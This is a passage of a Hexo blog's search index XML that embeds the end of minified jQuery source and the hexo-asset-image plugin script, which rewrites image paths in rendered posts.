n,r=i.xhr();if(r.open(i.type,i.url,i.async,i.username,i.password),i.xhrFields)for(n in i.xhrFields)r[n]=i.xhrFields[n];for(n in i.mimeType&&r.overrideMimeType&&r.overrideMimeType(i.mimeType),i.crossDomain||e["X-Requested-With"]||(e["X-Requested-With"]="XMLHttpRequest"),e)r.setRequestHeader(n,e[n]);o=function(e){return function(){o&&(o=a=r.onload=r.onerror=r.onabort=r.ontimeout=r.onreadystatechange=null,"abort"===e?r.abort():"error"===e?"number"!=typeof r.status?t(0,"error"):t(r.status,r.statusText):t(_t[r.status]||r.status,r.statusText,"text"!==(r.responseType||"text")||"string"!=typeof r.responseText?{binary:r.response}:{text:r.responseText},r.getAllResponseHeaders()))}},r.onload=o(),a=r.onerror=r.ontimeout=o("error"),void 0!==r.onabort?r.onabort=a:r.onreadystatechange=function(){4===r.readyState&&C.setTimeout(function(){o&&a()})},o=o("abort");try{r.send(i.hasContent&&i.data||null)}catch(e){if(o)throw e}},abort:function(){o&&o()}}}),S.ajaxPrefilter(function(e){e.crossDomain&&(e.contents.script=!1)}),S.ajaxSetup({accepts:{script:"text/javascript, application/javascript, application/ecmascript, application/x-ecmascript"},contents:{script:/\b(?:java|ecma)script\b/},converters:{"text script":function(e){return S.globalEval(e),e}}}),S.ajaxPrefilter("script",function(e){void 0===e.cache&&(e.cache=!1),e.crossDomain&&(e.type="GET")}),S.ajaxTransport("script",function(n){var r,i;if(n.crossDomain||n.scriptAttrs)return{send:function(e,t){r=S("<script>").attr(n.scriptAttrs||{}).prop({charset:n.scriptCharset,src:n.url}).on("load error",i=function(e){r.remove(),i=null,e&&t("error"===e.type?404:200,e.type)}),E.head.appendChild(r[0])},abort:function(){i&&i()}}});var Ut,Xt=[],Vt=/(=)\?(?=&|$)|\?\?/;S.ajaxSetup({jsonp:"callback",jsonpCallback:function(){var e=Xt.pop()||S.expando+"_"+Ct.guid++;return this[e]=!0,e}}),S.ajaxPrefilter("json jsonp",function(e,t,n){var r,i,o,a=!1!==e.jsonp&&(Vt.test(e.url)?"url":"string"==typeof e.data&&0===(e.contentType||"").indexOf("application/x-www-form-urlencoded")&&Vt.test(e.data)&&"data");if(a||"jsonp"===e.dataTypes[0])return r=e.jsonpCallback=m(e.jsonpCallback)?e.jsonpCallback():e.jsonpCallback,a?e[a]=e[a].replace(Vt,"$1"+r):!1!==e.jsonp&&(e.url+=(Et.test(e.url)?"&":"?")+e.jsonp+"="+r),e.converters["script json"]=function(){return o||S.error(r+" was not called"),o[0]},e.dataTypes[0]="json",i=C[r],C[r]=function(){o=arguments},n.always(function(){void 0===i?S(C).removeProp(r):C[r]=i,e[r]&&(e.jsonpCallback=t.jsonpCallback,Xt.push(r)),o&&m(i)&&i(o[0]),o=i=void 0}),"script"}),v.createHTMLDocument=((Ut=E.implementation.createHTMLDocument("").body).innerHTML="<form></form><form></form>",2===Ut.childNodes.length),S.parseHTML=function(e,t,n){return"string"!=typeof e?[]:("boolean"==typeof t&&(n=t,t=!1),t||(v.createHTMLDocument?((r=(t=E.implementation.createHTMLDocument("")).createElement("base")).href=E.location.href,t.head.appendChild(r)):t=E),o=!n&&[],(i=N.exec(e))?[t.createElement(i[1])]:(i=xe([e],t,o),o&&o.length&&S(o).remove(),S.merge([],i.childNodes)));var r,i,o},S.fn.load=function(e,t,n){var r,i,o,a=this,s=e.indexOf(" ");return-1<s&&(r=yt(e.slice(s)),e=e.slice(0,s)),m(t)?(n=t,t=void 0):t&&"object"==typeof t&&(i="POST"),0<a.length&&S.ajax({url:e,type:i||"GET",dataType:"html",data:t}).done(function(e){o=arguments,a.html(r?S("<div>").append(S.parseHTML(e)).find(r):e)}).always(n&&function(e,t){a.each(function(){n.apply(this,o||[e.responseText,t,e])})}),this},S.expr.pseudos.animated=function(t){return S.grep(S.timers,function(e){return t===e.elem}).length},S.offset={setOffset:function(e,t,n){var r,i,o,a,s,u,l=S.css(e,"position"),c=S(e),f={};"static"===l&&(e.style.position="relative"),s=c.offset(),o=S.css(e,"top"),u=S.css(e,"left"),("absolute"===l||"fixed"===l)&&-1<(o+u).indexOf("auto")?(a=(r=c.position()).top,i=r.left):(a=parseFloat(o)||0,i=parseFloat(u)||0),m(t)&&(t=t.call(e,n,S.extend({},s))),null!=t.top&&(f.top=t.top-s.top+a),null!=t.left&&(f.left=t.left-s.left+i),"using"in t?t.using.call(e,f):c.css(f)}},S.fn.extend({offset:function(t){if(arguments.length)return void 0===t?this:this.each(function(e){S.offset.setOffset(this,t,e)});var e,n,r=this[0];return r?r.getClientRects().length?(e=r.getBoundingClientRect(),n=r.ownerDocument.defaultView,{top:e.top+n.pageYOffset,left:e.left+n.pageXOffset}):{top:0,left:0}:void 0},position:function(){if(this[0]){var e,t,n,r=this[0],i={top:0,left:0};if("fixed"===S.css(r,"position"))t=r.getBoundingClientRect();else{t=this.offset(),n=r.ownerDocument,e=r.offsetParent||n.documentElement;while(e&&(e===n.body||e===n.documentElement)&&"static"===S.css(e,"position"))e=e.parentNode;e&&e!==r&&1===e.nodeType&&((i=S(e).offset()).top+=S.css(e,"borderTopWidth",!0),i.left+=S.css(e,"borderLeftWidth",!0))}return{top:t.top-i.top-S.css(r,"marginTop",!0),left:t.left-i.left-S.css(r,"marginLeft",!0)}}},offsetParent:function(){return this.map(function(){var e=this.offsetParent;while(e&&"static"===S.css(e,"position"))e=e.offsetParent;return e||re})}}),S.each({scrollLeft:"pageXOffset",scrollTop:"pageYOffset"},function(t,i){var o="pageYOffset"===i;S.fn[t]=function(e){return B(this,function(e,t,n){var r;if(x(e)?r=e:9===e.nodeType&&(r=e.defaultView),void 0===n)return r?r[i]:e[t];r?r.scrollTo(o?r.pageXOffset:n,o?n:r.pageYOffset):e[t]=n},t,e,arguments.length)}}),S.each(["top","left"],function(e,n){S.cssHooks[n]=_e(v.pixelPosition,function(e,t){if(t)return t=Be(e,n),Pe.test(t)?S(e).position()[n]+"px":t})}),S.each({Height:"height",Width:"width"},function(a,s){S.each({padding:"inner"+a,content:s,"":"outer"+a},function(r,o){S.fn[o]=function(e,t){var n=arguments.length&&(r||"boolean"!=typeof e),i=r||(!0===e||!0===t?"margin":"border");return B(this,function(e,t,n){var r;return x(e)?0===o.indexOf("outer")?e["inner"+a]:e.document.documentElement["client"+a]:9===e.nodeType?(r=e.documentElement,Math.max(e.body["scroll"+a],r["scroll"+a],e.body["offset"+a],r["offset"+a],r["client"+a])):void 0===n?S.css(e,t,i):S.style(e,t,n,i)},s,n?e:void 0,n)}})}),S.each(["ajaxStart","ajaxStop","ajaxComplete","ajaxError","ajaxSuccess","ajaxSend"],function(e,t){S.fn[t]=function(e){return this.on(t,e)}}),S.fn.extend({bind:function(e,t,n){return this.on(e,null,t,n)},unbind:function(e,t){return this.off(e,null,t)},delegate:function(e,t,n,r){return this.on(t,e,n,r)},undelegate:function(e,t,n){return 1===arguments.length?this.off(e,"**"):this.off(t,e||"**",n)},hover:function(e,t){return this.mouseenter(e).mouseleave(t||e)}}),S.each("blur focus focusin focusout resize scroll click dblclick mousedown mouseup mousemove mouseover mouseout mouseenter mouseleave change select submit keydown keypress keyup contextmenu".split(" "),function(e,n){S.fn[n]=function(e,t){return 0<arguments.length?this.on(n,null,e,t):this.trigger(n)}});var Gt=/^[\s\uFEFF\xA0]+|([^\s\uFEFF\xA0])[\s\uFEFF\xA0]+$/g;S.proxy=function(e,t){var n,r,i;if("string"==typeof t&&(n=e[t],t=e,e=n),m(e))return r=s.call(arguments,2),(i=function(){return e.apply(t||this,r.concat(s.call(arguments)))}).guid=e.guid=e.guid||S.guid++,i},S.holdReady=function(e){e?S.readyWait++:S.ready(!0)},S.isArray=Array.isArray,S.parseJSON=JSON.parse,S.nodeName=A,S.isFunction=m,S.isWindow=x,S.camelCase=X,S.type=w,S.now=Date.now,S.isNumeric=function(e){var t=S.type(e);return("number"===t||"string"===t)&&!isNaN(e-parseFloat(e))},S.trim=function(e){return null==e?"":(e+"").replace(Gt,"$1")},"function"==typeof define&&define.amd&&define("jquery",[],function(){return S});var Yt=C.jQuery,Qt=C.$;return S.noConflict=function(e){return C.$===S&&(C.$=Qt),e&&C.jQuery===S&&(C.jQuery=Yt),S},"undefined"==typeof e&&(C.jQuery=C.$=S),S});]]></content>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/static/js/hexo-asset-image/index.js"/>
      <url>/static/js/hexo-asset-image/index.js</url>
      
        <content type="html"><![CDATA['use strict';var cheerio = require('cheerio');// http://stackoverflow.com/questions/14480345/how-to-get-the-nth-occurrence-in-a-stringfunction getPosition(str, m, i) {    return str.split(m, i).join(m).length;}hexo.extend.filter.register('after_post_render', function (data) {    var config = hexo.config;    if (config.post_asset_folder) {        var link = data.permalink;        var beginPos = getPosition(link, '/', 3) + 1;        var appendLink = '';        // In hexo 3.1.1, the permalink of "about" page is like ".../about/index.html".        // if not with index.html endpos = link.lastIndexOf('.') + 1 support hexo-abbrlink        if (/.*\/index\.html$/.test(link)) {            // when permalink is end with index.html, for example 2019/02/20/xxtitle/index.html            // image in xxtitle/ will go to xxtitle/index/            appendLink = 'index/';            var endPos = link.lastIndexOf('/');        } else {            var endPos = link.lastIndexOf('.');        }        link = link.substring(beginPos, endPos) + '/' + appendLink;        var toprocess = ['excerpt', 'more', 'content'];        for (var i = 0; i < toprocess.length; i++) {            var key = toprocess[i];            var $ = cheerio.load(data[key], {                ignoreWhitespace: false,                xmlMode: false,                lowerCaseTags: false,                decodeEntities: false            });            $('img').each(function () {                if ($(this).attr('src')) {                    // For windows style path, we replace '\' to '/'.                    var src = $(this).attr('src').replace('\\', '/');                    if (!(/http[s]*.*|\/\/.*/.test(src)                        || /^\s+\//.test(src)                        || /^\s*\/uploads|images\//.test(src))) {                        // For "about" page, the first part of "src" can't be removed.                        // In addition, to support multi-level local directory.                        var linkArray = link.split('/').filter(function (elem) {                            return elem != '';                        });                        var srcArray = src.split('/').filter(function (elem) {                            return elem != '' && elem != '.';                        });                        if (srcArray.length > 1)                            srcArray.shift();                        src = srcArray.join('/');                        // 文章详情页图片路径设置                        // $(this).attr('src', config.root + link + src);                        // console.info&&console.info("update link as:-->"+config.root + link + src);                        var uri = data.permalink.split('/').pop();                        // console.log(1, config.root)                        // console.log(2, uri)                        // console.log(3, src)                        $(this).attr('src', config.root + 'posts/' + uri + "/" + src);                        console.info && console.info("update link as:-->" + config.root + uri + "/" + src);                    }                } else {                    console.info && console.info("no src attr, skipped...");                    console.info && console.info($(this));                }            });            data[key] = $.html();        }    }});]]></content>
      
    </entry>
    
    
  
</search>
